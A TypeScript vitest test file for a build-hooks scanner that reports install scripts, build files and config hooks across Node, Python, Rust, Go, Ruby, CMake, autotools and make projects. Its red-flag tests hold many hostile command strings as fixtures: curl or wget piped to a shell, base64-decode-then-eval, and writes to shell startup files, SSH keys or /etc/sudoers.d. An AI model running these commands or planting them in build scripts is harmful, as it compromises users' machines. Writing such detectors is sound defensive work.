import { describe, expect, it } from "vitest";
import { analyzeBuildHooks, BUILD_FILE_PATTERNS, fileKind, PRUNE_DIRS, scanRedFlags } from "../src/scan/build-hooks.js";
import type { BuildWalk, CheckOutcome } from "../src/scan/types.js";
import type { Ecosystem } from "../src/types.js";

const walkOf = (files: Record<string, string>, extra: Partial<BuildWalk> = {}): BuildWalk => ({
  files: Object.entries(files).map(([path, content]) => ({ path, content })),
  ...extra,
});
const run = (eco: Ecosystem, files: Record<string, string>, extra: Partial<BuildWalk> = {}): CheckOutcome => analyzeBuildHooks(eco, walkOf(files, extra));
const runs = (o: CheckOutcome) => o.findings.filter((f) => f.ruleId === "build-hooks/runs");
const rule = (o: CheckOutcome, id: string) => o.findings.filter((f) => f.ruleId === id);
const locs = (o: CheckOutcome) => o.findings.map((f) => f.location);
const pkg = (scripts: Record<string, unknown>) => JSON.stringify({ name: "x", scripts }, null, 2);
const rf = (text: string, same = false) => scanRedFlags(text, same).map((h) => h.rule.replace("build-hooks/", ""));

describe("shape", () => {
  it("is a builtin check named build-hooks, ran, with the standing notes", () => {
    const o = run("generic", {});
    expect(o).toMatchObject({ name: "build-hooks", kind: "builtin", status: "ran", omitted: 0, findings: [] });
    const notes = o.notes.join("\n");
    expect(notes).toContain("generic");
    expect(notes).toMatch(/heuristic reading aid, not a guarantee/);
    expect(notes).toContain("obfuscation");
    expect(notes).toMatch(/dependencies is not listed|of dependencies/);
    expect(notes).toMatch(/not read/);
    expect(notes).toContain("--help");
    expect(notes).toMatch(/saved to a file and run later is not detected/);
    expect(notes).toMatch(/nothing is built/);
  });
  it("is incomplete when the walk is, with the reason in notes; findings still reported", () => {
    const o = run("node", { "package.json": pkg({ postinstall: "x" }) }, { incomplete: "file limit reached" });
    expect(o.status).toBe("incomplete");
    expect(o.findings).toHaveLength(1);
    expect(o.notes.join(" ")).toContain("file limit reached");
  });
  it("is incomplete for a skipped link of a kind this ecosystem reads, not for another's", () => {
    expect(run("node", {}, { skippedLinks: ["package.json"] }).status).toBe("incomplete");
    expect(run("node", {}, { skippedLinks: ["pkg/package.json"] }).status).toBe("incomplete");
    expect(run("node", {}, { skippedLinks: ["Makefile"] }).status).toBe("ran");
    expect(run("make", {}, { skippedLinks: ["Makefile"] }).status).toBe("incomplete");
    expect(run("autotools", {}, { skippedLinks: ["configure"] }).status).toBe("incomplete");
    expect(run("node", {}, { skippedLinks: ["README.md"] }).status).toBe("ran");
  });
  it("is incomplete for a truncated file of a kind it reads", () => {
    const w = walkOf({ "package.json": pkg({ postinstall: "x" }) });
    w.files[0]!.truncated = true;
    expect(analyzeBuildHooks("node", w).status).toBe("incomplete");
    expect(analyzeBuildHooks("go", w).status).toBe("ran");
  });
  it("a truncated, unparseable package.json is incomplete, and says it could not be parsed", () => {
    const w = walkOf({ "package.json": '{"scripts": {"postinstall": "node x' });
    w.files[0]!.truncated = true;
    const o = analyzeBuildHooks("node", w);
    expect(o.status).toBe("incomplete");
    expect(o.notes.join(" ")).toMatch(/could not be parsed/);
  });
  it("a truncated generated autotools file is a note finding, not incomplete", () => {
    const w = walkOf({ configure: "#!/bin/sh\n" + "x".repeat(100), "Makefile.in": "all:\n", "aclocal.m4": "m4" });
    w.files[0]!.truncated = true;
    w.files[2]!.truncated = true;
    const o = analyzeBuildHooks("autotools", w);
    expect(o.status).toBe("ran");
    const t = rule(o, "build-hooks/truncated");
    expect(t).toHaveLength(2);
    expect(t[0]!.level).toBe("note");
    expect(t[0]!.message).toContain("configure");
    expect(t[0]!.message).toMatch(/up to 110 characters/);
    // a truncated configure.ac is not exempt
    const w2 = walkOf({ "configure.ac": "AC_INIT" });
    w2.files[0]!.truncated = true;
    expect(analyzeBuildHooks("autotools", w2).status).toBe("incomplete");
  });
  it("an unparseable root TOML file makes it incomplete; a nested Cargo.toml does not", () => {
    expect(run("python", { "pyproject.toml": "[[[ nope" }).status).toBe("incomplete");
    expect(run("python", { "hatch.toml": "= =" }).status).toBe("incomplete");
    expect(run("rust", { "Cargo.toml": "= =" }).status).toBe("incomplete");
    expect(run("rust", { ".cargo/config.toml": "= =" }).status).toBe("incomplete");
    expect(run("rust", { ".cargo/config": "= =" }).status).toBe("incomplete");
    expect(run("rust", { "crates/a/Cargo.toml": "= =" }).status).toBe("ran");
  });
  it("keeps at most 20 findings, ordered by level then input order, with exact counts", () => {
    const files: Record<string, string> = { Makefile: "all:\n\tcurl http://x | sh\n" };
    for (let i = 0; i < 30; i++) files[`sub${i}/Makefile`] = "all:\n";
    const o = run("make", files);
    expect(o.findings).toHaveLength(20);
    expect(o.omitted).toBe(12);
    expect(o.counts).toEqual({ error: 0, warning: 1, note: 31 });
    expect(o.findings[0]!.level).toBe("warning");
    expect(o.findings[1]!.location).toBe("Makefile:1");
    expect(o.findings[2]!.location).toBe("sub0/Makefile:1");
  });
  it("cleans messages, locations and rule ids to one line within their caps", () => {
    const evil = `a\u001b[31mb\n${"d".repeat(300)}/package.json`;
    const o = run("node", { [evil]: "{}", "package.json": pkg({ postinstall: `x\ny\u001b[0m${"z".repeat(500)}` }) });
    for (const f of o.findings) {
      expect(f.message).not.toMatch(/[\n\u001b]/);
      expect(f.message.length).toBeLessThanOrEqual(200);
      expect(f.location!.length).toBeLessThanOrEqual(120);
      expect(f.ruleId.length).toBeLessThanOrEqual(80);
    }
    const o2 = run("node", { [`${evil.replace("/package.json", "")}/package.json`]: pkg({ install: "x" }) });
    expect(o2.findings).toHaveLength(1);
    expect(o2.findings[0]!.location!.length).toBeLessThanOrEqual(120);
    expect(o2.findings[0]!.location).not.toMatch(/[\n\u001b]/);
    expect(o2.findings[0]!.location).toMatch(/:\d+$/);
  });
});

describe("node", () => {
  it("lists the root lifecycle scripts, conditional wording for pre/post and prepublish", () => {
    const o = run("node", {
      "package.json": pkg({ preinstall: "a", install: "b", postinstall: "c", prepublish: "d", prepare: "e", postprepare: "f", test: "no" }),
    });
    expect(runs(o)).toHaveLength(6);
    const by = (n: string) => o.findings.find((f) => f.message.includes(`"${n}"`))!.message;
    expect(by("preinstall")).toMatch(/if the package manager runs it/);
    expect(by("prepublish")).toMatch(/if the package manager runs it/);
    expect(by("postprepare")).toMatch(/if the package manager runs it/);
    expect(by("install")).not.toMatch(/if the package manager/);
    expect(by("prepare")).not.toMatch(/if the package manager/);
    expect(o.findings.every((f) => f.level === "note")).toBe(true);
    expect(o.notes.join(" ")).toMatch(/corepack/);
  });
  it("lists build scripts only when build exists, naming the package manager the recipe picks", () => {
    expect(runs(run("node", { "package.json": pkg({ prebuild: "p" }) }))).toHaveLength(0);
    const o = run("node", { "package.json": pkg({ prebuild: "p", build: "tsc", postbuild: "q" }), "yarn.lock": "" });
    expect(runs(o).map((f) => f.message.match(/"(\w+)"/)![1])).toEqual(["prebuild", "build", "postbuild"]);
    expect(o.findings.find((f) => f.message.includes('"build"'))!.message).toContain("yarn run build");
    expect(run("node", { "package.json": pkg({ build: "x" }), "pnpm-lock.yaml": "" }).findings[0]!.message).toContain("pnpm run build");
  });
  it("reports line numbers, with CRLF, and line 1 when the key is not found", () => {
    const text = pkg({ test: "t", postinstall: "p" }).replace(/\n/g, "\r\n");
    expect(locs(run("node", { "package.json": text }))).toEqual(["package.json:5"]);
    expect(locs(run("node", { "package.json": '{"scripts":{"postinstall":"p"}}' }))).toEqual(["package.json:1"]);
    // a "postinstall" earlier in the file (outside scripts) is not the one found
    const t2 = '{"description": "postinstall",\n"scripts": {\n"postinstall": "p"}}';
    expect(locs(run("node", { "package.json": t2 }))).toEqual(["package.json:3"]);
  });
  it("strips a BOM; a parse error, a non-object, a non-object scripts are notes; non-string scripts are skipped", () => {
    expect(runs(run("node", { "package.json": "\uFEFF" + pkg({ install: "x" }) }))).toHaveLength(1);
    for (const bad of ["{oops", "[]", "null", '{"scripts": []}', '{"scripts": "x"}']) {
      const o = run("node", { "package.json": bad });
      expect(o.findings).toEqual([]);
      expect(o.status).toBe("ran");
      expect(o.notes.join(" ")).toMatch(/package\.json (could not be parsed|is not a JSON object|has a "scripts")/);
    }
    expect(runs(run("node", { "package.json": pkg({ install: 5, postinstall: ["x"], prepare: "ok" }) }))).toHaveLength(1);
  });
  it("survives deeply nested JSON (RangeError) as a note", () => {
    const o = run("node", { "package.json": "[".repeat(200_000) });
    expect(o.findings).toEqual([]);
    expect(o.notes.join(" ")).toMatch(/could not be parsed/);
  });
  it("handles 10,000 scripts and a 1 MB script string within the finding cap", () => {
    const scripts: Record<string, string> = {};
    for (let i = 0; i < 10_000; i++) scripts[`s${i}`] = "echo";
    scripts.postinstall = "x".repeat(1_000_000);
    const t0 = Date.now();
    const o = run("node", { "package.json": pkg(scripts) });
    expect(Date.now() - t0).toBeLessThan(3000);
    expect(o.findings).toHaveLength(1);
    expect(o.findings[0]!.message.length).toBeLessThanOrEqual(200);
  });
  it("lists nested package.json install scripts as conditional", () => {
    const o = run("node", { "packages/a/package.json": pkg({ postinstall: "x", build: "y" }) });
    expect(runs(o)).toHaveLength(1);
    expect(o.findings[0]!.message).toMatch(/only if this is an installed workspace package/);
    expect(o.findings[0]!.location).toBe("packages/a/package.json:1".replace(":1", `:${o.findings[0]!.location!.split(":")[1]}`));
  });
  it("binding.gyp beside a package.json with no install script is conditional", () => {
    const a = run("node", { "package.json": pkg({ test: "t" }), "binding.gyp": "{}" });
    expect(a.findings.find((f) => f.location === "binding.gyp:1")!.message).toMatch(/may run `node-gyp rebuild`/);
    expect(run("node", { "package.json": pkg({ install: "x" }), "binding.gyp": "{}" }).findings.some((f) => f.location === "binding.gyp:1")).toBe(false);
    expect(run("node", { "binding.gyp": "{}" }).findings).toHaveLength(0);
  });
  it("root .pnpmfile.cjs only with pnpm-lock.yaml; yarn config only with yarn.lock, naming the file not read", () => {
    expect(run("node", { ".pnpmfile.cjs": "x" }).findings).toHaveLength(0);
    expect(run("node", { ".pnpmfile.cjs": "x", "pnpm-lock.yaml": "" }).findings.map((f) => f.location)).toEqual([".pnpmfile.cjs:1"]);
    const yml = "nodeLinker: node-modules\nyarnPath: .yarn/releases/yarn-3.cjs\nplugins:\n  - path: x\n";
    expect(run("node", { ".yarnrc.yml": yml }).findings).toHaveLength(0);
    const o = run("node", { ".yarnrc.yml": yml, "yarn.lock": "" });
    expect(o.findings.map((f) => f.location)).toEqual([".yarnrc.yml:2", ".yarnrc.yml:3"]);
    expect(o.findings[0]!.message).toMatch(/\.yarn\/releases\/yarn-3\.cjs.*not read/);
    const o2 = run("node", { ".yarnrc": 'yarn-path "./.yarn/y.js"\n', "yarn.lock": "" });
    expect(o2.findings[0]!.message).toMatch(/\.yarn\/y\.js.*not read/);
    // a named file that the walk did read is reported as read
    const o3 = run("node", { ".yarnrc": 'yarn-path ".yarn/y.js"\n', "yarn.lock": "", ".yarn/y.js": "x" });
    expect(o3.findings.map((f) => f.location)).toEqual([".yarn/y.js:1"]);
  });
  it(".npmrc script-shell, node-options, git, node-gyp are findings; registry says where packages come from", () => {
    const o = run("node", { ".npmrc": "; c\nscript-shell=/x/sh\nnode-options = --require ./x.js\ngit=/x/git\nnode-gyp = /x\n//r/:_authToken=t\nregistry=https://r.example\n@s:registry = https://s\nlog-level=info\n" });
    expect(o.findings.map((f) => f.location)).toEqual([".npmrc:2", ".npmrc:3", ".npmrc:4", ".npmrc:5", ".npmrc:7", ".npmrc:8"]);
    expect(rule(o, "build-hooks/source")).toHaveLength(2);
    expect(rule(o, "build-hooks/source")[0]!.message).toMatch(/where packages come from/);
  });
});

describe("python", () => {
  it("reports root setup.py, not a nested one", () => {
    const o = run("python", { "setup.py": "x", "sub/setup.py": "y" });
    expect(o.findings.map((f) => f.location)).toEqual(["setup.py:1"]);
  });
  it("names the build backend in notes and reports backend-path", () => {
    const o = run("python", { "pyproject.toml": '[build-system]\nrequires = ["x"]\nbuild-backend = "mybackend"\nbackend-path = ["tools"]\n' });
    expect(o.notes.join(" ")).toContain("mybackend");
    expect(o.findings.map((f) => f.location)).toEqual(["pyproject.toml:4"]);
    expect(o.notes.join(" ")).toMatch(/external build backend runs its own code/);
  });
  it("reports hatch custom hooks (pyproject.toml and hatch.toml), naming path or the default", () => {
    const pp = '[tool.hatch.build.hooks.custom]\npath = "tools/hook.py"\n[tool.hatch.metadata.hooks.custom]\n[tool.hatch.build.targets.wheel.hooks.custom]\npath = "w.py"\n[tool.hatch.build.hooks.other]\n';
    const o = run("python", { "pyproject.toml": pp, "hatch.toml": "[build.hooks.custom]\n", "hatch_build.py": "import os" });
    const msgs = o.findings.map((f) => `${f.location} ${f.message}`).join("\n");
    expect(msgs).toContain("tools/hook.py");
    expect(msgs).toContain("w.py");
    expect(o.findings.some((f) => f.location === "hatch_build.py:1")).toBe(true);
    expect(o.findings.filter((f) => /hatch custom/.test(f.message) || f.location === "hatch_build.py:1").length).toBeGreaterThanOrEqual(4);
    const v = run("python", { "pyproject.toml": '[tool.hatch.version]\nsource = "code"\npath = "src/v.py"\n' });
    expect(v.findings[0]!.message).toMatch(/version source.*src\/v\.py/);
    expect(run("python", { "pyproject.toml": '[tool.hatch.version]\nsource = "regex"\n' }).findings).toEqual([]);
  });
  it("reports poetry and pdm build scripts", () => {
    expect(run("python", { "pyproject.toml": '[tool.poetry.build]\nscript = "build.py"\n' }).findings[0]!.message).toContain("build.py");
    expect(run("python", { "pyproject.toml": '[tool.poetry]\nbuild = "legacy_build.py"\n' }).findings[0]!.message).toContain("legacy_build.py");
    expect(run("python", { "pyproject.toml": '[tool.pdm.build]\nsetup-script = "setup_pdm.py"\n' }).findings[0]!.message).toContain("setup_pdm.py");
  });
  it("native backends make their build files findings", () => {
    const m = run("python", { "pyproject.toml": '[build-system]\nbuild-backend = "maturin"\n', "Cargo.toml": "[package]", "build.rs": "fn main(){}" });
    expect(m.findings.map((f) => f.location)).toEqual(expect.arrayContaining(["build.rs:1"]));
    expect(m.findings.some((f) => f.location === "Cargo.toml:1")).toBe(true);
    const mm = run("python", { "pyproject.toml": '[build-system]\nbuild-backend = "mesonpy"\n', "meson.build": "p", "meson.options": "o" });
    expect(mm.findings.map((f) => f.location)).toEqual(expect.arrayContaining(["meson.build:1", "meson.options:1"]));
    const sk = run("python", { "pyproject.toml": '[build-system]\nbuild-backend = "scikit_build_core.build"\n', "CMakeLists.txt": "c" });
    expect(sk.findings.some((f) => f.location === "CMakeLists.txt:1")).toBe(true);
    const sr = run("python", { "pyproject.toml": '[build-system]\nrequires = ["setuptools-rust", "setuptools"]\nbuild-backend = "setuptools.build_meta"\n', "Cargo.toml": "x" });
    expect(sr.findings.some((f) => f.location === "Cargo.toml:1")).toBe(true);
    const mp = run("python", { "pyproject.toml": '[build-system]\nbuild-backend = "maturin"\n[tool.maturin]\nmanifest-path = "rust/Cargo.toml"\n' });
    expect(mp.findings[0]!.message).toMatch(/rust\/Cargo\.toml.*not read/);
  });
  it("reports build requirements that are URLs or files", () => {
    const o = run("python", { "pyproject.toml": '[build-system]\nrequires = ["setuptools", "evil @ https://x.example/e.zip", "loc @ file:///x", "https://x/y.whl", "wheel"]\n' });
    expect(o.findings).toHaveLength(3);
  });
  it("reports attr: in setup.cfg and pyproject dynamic", () => {
    const o = run("python", { "setup.cfg": "[metadata]\nversion = attr: pkg.__version__\nname = x\n", "pyproject.toml": '[tool.setuptools.dynamic]\nversion = { attr = "pkg2.VERSION" }\nreadme = { file = "R.md" }\n' });
    const m = o.findings.map((f) => f.message).join("\n");
    expect(m).toMatch(/may import .*pkg2\.VERSION/);
    expect(m).toMatch(/may import the module named by `attr: pkg\.__version__`/);
    expect(o.findings).toHaveLength(2);
  });
  it("requirements.txt: primary path when alone, fallback with setup.py; flags the risky lines only", () => {
    const req = ["requests==2", "-e .", "-e git+https://x/y#egg=z", "./local", "../up", "/abs/p", "sub/", "pkg @ file:///p", "file:./x", "-r more.txt", "-c c.txt", "--index-url https://i", "--extra-index-url=https://j", "-i https://k", "--find-links /f", "-f /g", "--trusted-host h", "https://x.example/p.whl", "numpy>=1 # note", "# -e ."].join("\n");
    const alone = run("python", { "requirements.txt": req });
    expect(alone.findings).toHaveLength(16);
    expect(alone.findings[0]!.message).toMatch(/the install path/);
    expect(rule(alone, "build-hooks/source")).toHaveLength(6);
    expect(alone.findings.every((f) => !f.message.includes("requests==2") && !f.location!.endsWith(":1") && !f.location!.endsWith(":19"))).toBe(true);
    const fb = run("python", { "requirements.txt": "-e .\n", "setup.py": "" });
    expect(fb.findings.find((f) => f.location === "requirements.txt:1")!.message).toMatch(/fallback when `pip install \.` fails/);
  });
});

describe("rust", () => {
  const cargo = (extra = "") => `[package]\nname = "a"\nversion = "0.1.0"\n${extra}`;
  it("reports build.rs beside a manifest, unconditionally at the root and conditionally in a member", () => {
    const o = run("rust", { "Cargo.toml": cargo(), "build.rs": "fn main(){}", "crates/b/Cargo.toml": cargo(), "crates/b/build.rs": "fn main(){}" });
    expect(o.findings.map((f) => f.location)).toEqual(["build.rs:1", "crates/b/build.rs:1"]);
    expect(o.findings[0]!.message).not.toMatch(/if this crate/);
    expect(o.findings[1]!.message).toMatch(/if this crate is built as a member/);
  });
  it("build = false, autobuild = false, and a replaced path", () => {
    expect(run("rust", { "Cargo.toml": cargo("build = false\n"), "build.rs": "x" }).findings).toEqual([]);
    expect(run("rust", { "Cargo.toml": cargo("autobuild = false\n"), "build.rs": "x" }).findings).toEqual([]);
    const o = run("rust", { "Cargo.toml": cargo('build = "other.rs"\n'), "build.rs": "x" });
    expect(o.findings.map((f) => f.location)).toEqual(["Cargo.toml:4"]);
    expect(o.findings[0]!.message).toMatch(/other\.rs.*not read/);
    expect(run("rust", { "Cargo.toml": cargo('build = "other.rs"\n'), "other.rs": "x" }).findings.map((f) => f.location)).toEqual(["other.rs:1"]);
  });
  it("a virtual workspace has no build script of its own", () => {
    expect(run("rust", { "Cargo.toml": '[workspace]\nmembers = ["a"]\n', "build.rs": "x" }).findings).toEqual([]);
  });
  it("reports proc-macro crates", () => {
    const o = run("rust", { "Cargo.toml": cargo("[lib]\nproc-macro = true\n") });
    expect(o.findings).toHaveLength(1);
    expect(o.findings[0]!.message).toMatch(/proc-macro/);
  });
  it("a Cargo.toml that cannot be parsed still reports the build.rs beside it, with a note", () => {
    const o = run("rust", { "crates/a/Cargo.toml": "= =", "crates/a/build.rs": "x" });
    expect(o.findings.map((f) => f.location)).toEqual(["crates/a/build.rs:1"]);
    expect(o.notes.join(" ")).toMatch(/could not be parsed as TOML/);
  });
  it("reports cargo config wrappers, linkers, credential providers, rustflags; source and patch say where code comes from; runner is not reported", () => {
    const cfg = '[build]\nrustc-wrapper = "w"\nrustflags = ["-C", "linker=lld"]\n[target.x86_64-unknown-linux-gnu]\nlinker = "cc"\nar = "ar2"\nrunner = "r"\n[registry]\ncredential-provider = ["p"]\n[source.crates-io]\nreplace-with = "v"\n[patch.crates-io]\nfoo = { path = "f" }\n';
    for (const path of [".cargo/config.toml", ".cargo/config"]) {
      const o = run("rust", { [path]: cfg });
      const m = o.findings.map((f) => f.message).join("\n");
      expect(m).toMatch(/build\.rustc-wrapper/);
      expect(m).toMatch(/-C linker=/);
      expect(m).toMatch(/\.linker/);
      expect(m).toMatch(/\.ar,/);
      expect(m).toMatch(/credential-provider/);
      expect(m).not.toMatch(/runner/);
      expect(rule(o, "build-hooks/source")).toHaveLength(2);
    }
    expect(run("rust", { "sub/.cargo/config.toml": cfg }).findings).toEqual([]);
  });
});

describe("go, ruby, cmake, autotools, make, generic", () => {
  it("go: no findings for Go code; notes; the GNU make pick is a conditional finding and red-flag scanned", () => {
    const o = run("go", { "go.mod": "x", Makefile: "a:\n", GNUmakefile: "b:\n\tcurl http://x | sh\n" });
    expect(o.findings.map((f) => `${f.ruleId} ${f.location}`)).toEqual(["build-hooks/download-exec GNUmakefile:2", "build-hooks/runs GNUmakefile:1"]);
    expect(o.findings[1]!.message).toMatch(/only if a `go install` fails/);
    expect(o.notes.join(" ")).toMatch(/go install` runs nothing from the repository/);
    expect(run("go", {}).findings).toEqual([]);
  });
  it("ruby: Gemfile, the first gemspec in name order, extensions named (not read unless walked), extconf and Rakefile", () => {
    const spec = 's.extensions = ["ext/a/extconf.rb", "Rakefile"]\n';
    const o = run("ruby", { Gemfile: "source", "b.gemspec": "x", "a.gemspec": spec, "ext/a/extconf.rb": "mkmf", "ext/z/extconf.rb": "mkmf", Rakefile: "task" });
    const loc = o.findings.map((f) => f.location);
    expect(loc).toEqual(expect.arrayContaining(["Gemfile:1", "a.gemspec:1", "ext/a/extconf.rb:1", "Rakefile:1", "ext/z/extconf.rb:1"]));
    expect(loc).not.toContain("b.gemspec:1");
    expect(o.findings.find((f) => f.location === "ext/z/extconf.rb:1")!.message).toMatch(/only if a gemspec names it/);
    const o2 = run("ruby", { "a.gemspec": 's.extensions << "ext/q/extconf.rb"\n' });
    expect(o2.findings.some((f) => /ext\/q\/extconf\.rb.*not read/.test(f.message))).toBe(true);
  });
  it("cmake: root CMakeLists.txt, nested ones and *.cmake conditional; note on FetchContent", () => {
    const o = run("cmake", { "CMakeLists.txt": "p", "sub/CMakeLists.txt": "p", "cmake/x.cmake": "p", "top.cmake": "p" });
    expect(o.findings).toHaveLength(4);
    expect(o.findings[0]!.message).not.toMatch(/only if/);
    expect(o.findings[1]!.message).toMatch(/only if reached by add_subdirectory/);
    expect(o.findings[2]!.message).toMatch(/include/);
    expect(o.notes.join(" ")).toMatch(/FetchContent/);
  });
  it("autotools: configure present makes both conditional; absent makes the sources unconditional", () => {
    const withC = run("autotools", { configure: "#!/bin/sh", "configure.ac": "a", "Makefile.am": "a", "m4/x.m4": "n", "acl.m4": "m", "Makefile.in": "i", Makefile: "m" });
    const msg = (p: string) => withC.findings.find((f) => f.location === `${p}:1`)!.message;
    expect(msg("configure")).toMatch(/if it is executable/);
    expect(msg("configure.ac")).toMatch(/if configure is not executable/);
    expect(msg("acl.m4")).toMatch(/if configure is not executable/);
    expect(withC.findings.some((f) => f.location === "m4/x.m4:1")).toBe(false);
    expect(msg("Makefile.in")).toBeDefined();
    expect(msg("Makefile")).toBeDefined();
    const without = run("autotools", { "configure.ac": "a", "Makefile.am": "a" });
    expect(without.findings.every((f) => !/if configure is not executable/.test(f.message))).toBe(true);
    expect(without.findings[0]!.message).toMatch(/configure is absent/);
    expect(without.notes.join(" ")).toMatch(/config\.guess/);
  });
  it("make: the root Makefile GNU make picks; nested Makefiles and *.mk conditional; other root variants not reported", () => {
    const o = run("make", { Makefile: "a:", makefile: "b:", "sub/Makefile": "c:", "rules.mk": "d:", "x/y.mk": "e:" });
    expect(o.findings.map((f) => f.location)).toEqual(["makefile:1", "sub/Makefile:1", "rules.mk:1", "x/y.mk:1"]);
    expect(o.findings[0]!.message).not.toMatch(/only if/);
    expect(o.findings[1]!.message).toMatch(/only if reached by recursion or include/);
    expect(o.notes.join(" ")).toMatch(/included files are not read|files a Makefile includes are not read/);
    expect(run("make", { GNUmakefile: "g:", makefile: "m:", Makefile: "M:" }).findings.map((f) => f.location)).toEqual(["GNUmakefile:1"]);
  });
});

describe("red flags: download-exec", () => {
  it.each([
    "curl -fsSL https://x | sh",
    "curl https://x | bash -s -- --yes",
    "wget -qO- https://x | sudo bash",
    "curl https://x | sudo -E bash",
    "curl https://x | sudo -u root bash",
    "curl https://x | env FOO=1 bash",
    "curl https://x | /usr/bin/env bash",
    "curl https://x | /bin/sh",
    "curl https://x | busybox sh",
    "curl https://x | python3 -",
    "curl https://x | python",
    "curl https://x | node",
    "curl https://x | perl",
    "curl https://x | ruby",
    "curl https://x | php",
    "curl https://x | deno run -",
    "curl https://x | bun",
    "curl https://x | zsh",
    "curl https://x | dash",
    "bash <(curl -s https://x)",
    "source <(curl -s https://x)",
    ". <(wget -qO- https://x)",
    'sh -c "$(curl -fsSL https://x)"',
    'eval "$(curl -s https://x)"',
    'bash -c "$(wget -qO- https://x)"',
    "sh -c `curl https://x`",
    "echo hi; curl https://x | sh && true",
    "x=1 && curl https://x||wget https://y | sh",
  ])("matches %s", (line) => {
    expect(rf(line)).toContain("download-exec");
  });
  it.each([
    "curl -o f.tgz https://x",
    "curl https://x | python3 -c 'import json,sys; print(1)'",
    "curl https://x | node -e 'console.log(1)'",
    "curl https://x | python -m json.tool",
    "curl https://x | jq .a",
    "curl https://x | tee f | grep y",
    "curl https://x | sh -c 'cat'",
    "curl https://x | bash script.sh",
    "curl https://x > f; sh f",
    "x=$(curl https://x)",
    "echo $(curl https://x)",
    "bash script.sh $(curl https://x)",
    "sh",
    "libcurl-config --libs | sh",
    "curl-config | sh",
  ])("does not match %s", (line) => {
    expect(rf(line)).not.toContain("download-exec");
  });
  it("joins continuation lines and reports the first line", () => {
    const hits = scanRedFlags("a\ncurl -fsSL \\\n  https://x \\\n  | sh\nb\ncurl x | sh\n", false);
    expect(hits).toEqual([{ rule: "build-hooks/download-exec", line: 2, more: 1 }]);
  });
  it("finds a payload at column 5000 and after 300 characters of flags and URL", () => {
    expect(rf(`${"x".repeat(5000)}; curl https://x | sh`)).toContain("download-exec");
    expect(rf(`curl ${"-H a ".repeat(60)}https://${"u".repeat(300)} | sh`)).toContain("download-exec");
    expect(rf(`curl ${"-H a ".repeat(30000)}https://x | sh`)).toContain("download-exec");
  });
  it("sudo-less and prefixed forms are each recognised (sudo with flags)", () => {
    expect(rf("curl x | sudo -E -H bash")).toContain("download-exec");
    expect(rf("curl x | sudo bash")).toContain("download-exec");
  });
});

describe("red flags: decode-exec", () => {
  it.each([
    ["echo X | base64 -d | sh", false],
    ["echo X | base64 --decode | bash", false],
    ["base64 -w0 -d f | sh", false],
    ["eval(atob('x'))", false],
    ["node -e \"eval(Buffer.from('x','base64').toString())\"", false],
    ["const b = Buffer.from(s, 'hex'); execSync(b)", false],
    ["exec(base64.b64decode(x))", false],
    ["exec(bytes.fromhex(x))", false],
    ["new Function(atob(x))", false],
    ["import os\nx = unhexlify(y)\n\nos.system('a')\nsh -c foo\n", false],
    ["a=$(echo x | base64 -d); eval $a", true],
  ])("matches %j", (text, same) => {
    expect(rf(text, same)).toContain("decode-exec");
  });
  it.each([
    ["exec(open('version.py').read())", false],
    ["x = base64.b64encode(y)", false],
    ["echo x | base64", false],
    ["evaluate(atob('x'))", false],
    ["const reval = atob(x)", false],
    ["Buffer.from(x, 'utf8'); eval(y)", false],
    ["atob(x)\n" + "\n".repeat(11) + "eval(y)", false],
    ["atob(x)\neval(y)", true],
    ["$(eval X := 1)\nbase64 -d f", true],
  ])("does not match %j", (text, same) => {
    expect(rf(text, same)).not.toContain("decode-exec");
  });
  it("within 10 lines either way matches; in the same script string for package.json", () => {
    expect(rf("atob(x)\n" + "\n".repeat(9) + "eval(y)")).toContain("decode-exec");
    expect(rf("eval(y)\n" + "\n".repeat(9) + "atob(x)")).toContain("decode-exec");
    const o = run("node", { "package.json": pkg({ postinstall: "node -e \"eval(atob('eA=='))\"", build2: "eval x" }) });
    expect(rule(o, "build-hooks/decode-exec")).toHaveLength(1);
  });
  it("in Makefiles and configure, decoder and executor must share a line", () => {
    const mk = run("make", { Makefile: "all:\n\tbase64 -d f > g\n\t$(eval X := 1)\n" });
    expect(rule(mk, "build-hooks/decode-exec")).toHaveLength(0);
    const mk2 = run("make", { Makefile: "all:\n\tbase64 -d f | sh\n" });
    expect(rule(mk2, "build-hooks/decode-exec")).toHaveLength(1);
    const cfg = run("autotools", { configure: "x=$(echo a | base64 -d)\neval $x\n" });
    expect(rule(cfg, "build-hooks/decode-exec")).toHaveLength(0);
  });
});

describe("red flags: write-outside", () => {
  it.each([
    "echo x >> ~/.bashrc",
    'echo x > "$HOME/.bashrc"',
    'echo x >"$HOME"/.bashrc',
    "echo x > ${HOME}/.zshrc",
    "echo x >$(HOME)/.profile",
    "echo x > /root/.bash_profile",
    "echo x | tee -a ~/.gitconfig",
    "echo x | tee ~/.netrc",
    "cp k ~/.ssh/authorized_keys",
    "sudo cp -f p $HOME/.pypirc",
    "mv a ~/.aws/credentials",
    "install -m600 a /root/.ssh/id",
    "ln -sf x ~/.profile",
    "echo x > /etc/profile.d/x.sh",
    "echo x >> /etc/cron.d/x",
    "echo x > /etc/sudoers.d/x",
    "echo x > /etc/passwd",
    "echo x | tee /etc/shadow",
    "echo x > /etc/ld.so.preload",
    "echo x > /etc/environment",
    "fs.writeFileSync('/root/.bashrc', x)",
    "fs.appendFile(\"~/.zshrc\", x, cb)",
    "open('/root/.netrc', 'w')",
    "open(\"$HOME/.ssh/x\", \"a\")",
  ])("matches %s", (line) => {
    expect(rf(line)).toContain("write-outside");
  });
  it.each([
    "mkdir -p ~/.cache",
    "echo x > ~/.cache/y",
    "echo x > ~/.cargo/config",
    "cat /etc/os-release",
    "echo x > /etc/os-release",
    "cat ~/.bashrc",
    "cat ~/.bashrc > out",
    "cp ~/.bashrc /tmp/x",
    "echo //r/:_authToken=t >> ~/.npmrc",
    "echo x > /home/a/root/.bashrc",
    "open('~/.bashrc', 'r')",
    "fs.readFileSync('/root/.bashrc')",
    "echo x > ./.bashrc",
    "echo x > /etc/passwd2",
  ])("does not match %s", (line) => {
    expect(rf(line)).not.toContain("write-outside");
  });
  it("reports once per file and rule with a count of further lines", () => {
    const o = run("make", { Makefile: "a:\n\techo > ~/.bashrc\n\techo > ~/.zshrc\n\techo > ~/.profile\n" });
    const w = rule(o, "build-hooks/write-outside");
    expect(w).toHaveLength(1);
    expect(w[0]!.location).toBe("Makefile:2");
    expect(w[0]!.level).toBe("warning");
    expect(w[0]!.message).toMatch(/and 2 more lines/);
  });
});

describe("red flags: only in reported files", () => {
  it("scans a reported file whole and package.json only for its reported scripts", () => {
    const o = run("node", { "package.json": pkg({ test: "curl x | sh", postinstall: "echo hi" }) });
    expect(rule(o, "build-hooks/download-exec")).toHaveLength(0);
